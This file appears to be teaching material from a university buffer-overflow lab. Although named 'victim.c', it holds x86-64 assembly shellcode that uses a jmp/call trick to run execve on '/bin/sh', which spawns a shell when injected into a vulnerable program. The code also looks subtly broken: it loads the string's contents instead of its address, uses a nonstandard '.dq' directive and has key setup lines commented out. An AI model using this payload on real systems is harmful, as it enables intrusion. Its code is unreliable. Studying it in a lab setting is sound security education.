/* victim.c */
/* Author: Zecheng He @ Princeton University */
/* Modified from https://github.com/npapernot/buffer-overflow-attack to support 64-bit machines*/

#include <sys/syscall.h>

#define STRING  "/bin/sh\0"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

#define FILETORUN 0x400518

.globl main
        .type   main, @function

main:
        jmp callptr

payload:

        movq    file_to_run, %rcx
        //movq    %rcx, (ARGV)(%rcx)       /* set up argv pointer to pathname */

        xorq    %rax, %rax                 /* get a 64-bit zero value */
        //movq    %rax, (ENVP)(%rcx)       /* set up null envp */

        movq    $SYS_execve, %rax        /* syscall arg 1: syscall number */
        movq    %rcx, %rdi               /* syscall arg 2: string pathname */
        movq    %rcx, %rsi                 /* syscall arg 2: argv */
        movq    $0, %rdx                 /* syscall arg 3: envp */
        syscall                          /* invoke syscall */

        movq    $SYS_exit, %rax          /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi                /* syscall arg 2: 0 */
        syscall                          /* invoke syscall */

file_to_run:
        .ascii  "/bin/sh\0"
argv:
        .dq     file_to_run
envp:
        .ascii  "\0\0\0\0\0\0\0\0"

callptr:
    call    payload                      /* push STRING ptr to stack */

//.section .data
//file_to_run:
//    .ascii  STRING
